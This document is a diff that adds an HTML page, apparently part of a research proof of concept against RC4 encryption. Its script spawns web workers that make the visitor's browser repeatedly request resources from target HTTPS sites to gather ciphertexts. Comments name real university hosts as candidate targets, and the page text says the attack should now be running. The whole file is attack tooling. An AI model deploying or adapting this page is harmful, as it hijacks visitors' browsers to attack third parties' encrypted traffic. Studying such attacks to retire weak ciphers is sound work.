@@ -1,0 +1,29 @@
+<html><head><title>RC4 Ciphertext Generation</title>
+<script type="text/javascript">
+// 'https://idp.kuleuven.be/nonono.png'; // Keep-alive + supports RC4
+// 'https://webmail.cs.kuleuven.be/lala.png'; // Keep-alive but no RC4 support
+var TARGET1 = 'https://a.site.com/nono.png';
+var TARGET2 = 'https://b.site.com/nono.png';
+var WORKERS_LOC = 'worker.js';
+var WORKERS_NUM = 4;
+
+alert("Press OK to generate ciphertexts")
+
+for(var i = 0; i < WORKERS_NUM; i = i + 2) {
+	var worker = new Worker(WORKERS_LOC);
+	worker.postMessage(TARGET1);
+
+	worker = new Worker(WORKERS_LOC);
+	worker.postMessage(TARGET2);
+}
+
+console.log("Workers are running!");
+</script>
+
+</head>
+<body>
+
+The attack should be running now?
+
+</body>
+</html>
